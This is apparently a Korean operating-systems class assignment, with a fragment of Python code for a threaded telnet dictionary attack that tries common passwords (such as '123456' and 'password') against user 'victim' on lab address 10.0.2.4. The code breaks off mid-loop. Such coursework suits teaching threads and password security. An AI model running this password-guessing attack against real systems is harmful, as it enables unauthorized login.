# -
 “09-운영체제-프로세스와스레드4” 슬라이드에 있는 스레드 기반 사전 공격 프로그램을 이용한 사전 파일에서 자주 사용하는 비밀번호를 읽어 공격하도록 수정하는 과제이다.
import os import telnetlib import threading
words = ["123456", "12345", "123456789", "password", "iloveyou", "princess", "1234567", "rockyou"]
def dicattack (msg, i0): t = telnetlib.Telnet ("10.0.2.4") for i in range(i0, 8, 2): try: print msg + " / " + str (i) + " / ID: victim / Password: " + words [i]
